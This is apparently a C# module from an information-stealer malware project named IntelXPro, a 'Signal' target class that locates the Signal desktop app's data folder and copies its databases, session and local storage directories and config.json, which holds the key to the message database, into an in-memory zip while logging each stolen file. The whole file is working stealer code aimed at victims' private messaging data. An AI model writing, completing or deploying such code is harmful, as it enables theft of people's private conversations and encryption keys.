using IntelXPro.src.IntelXPro.Dependencies.Data;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace IntelXPro.src.IntelXPro.Stealer.Applications.Messengers
{
    internal class Signal : ITarget
    {
        public void Collect(InMemoryZip zip, Counter counter)
        {
            string text = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "Signal");
            if (!Directory.Exists(text))
            {
                return;
            }
            Counter.CounterApplications counterApplications = new Counter.CounterApplications();
            counterApplications.Name = "Signal";
            string[] array = new string[4] { "databases", "Session Storage", "Local Storage", "sql" };
            foreach (string path in array)
            {
                string text2 = Path.Combine(text, path);
                if (Directory.Exists(text2))
                {
                    string text3 = Path.Combine("Signal", path);
                    zip.AddDirectoryFiles(text2, text3);
                    counterApplications.Files.Add(text2 + " => " + text3);
                }
            }
            string text4 = Path.Combine(text, "config.json");
            if (File.Exists(text4))
            {
                string text5 = Path.Combine("Signal", "config.json");
                zip.AddFile(text5, File.ReadAllBytes(text4));
                counterApplications.Files.Add(text4 + " => " + text5);
                counterApplications.Files.Add(text5);
            }
            if (counterApplications.Files.Count > 0)
            {
                counterApplications.Files.Add("Signal\\");
                counter.Messangers.Add(counterApplications);
            }
        }
    }

}
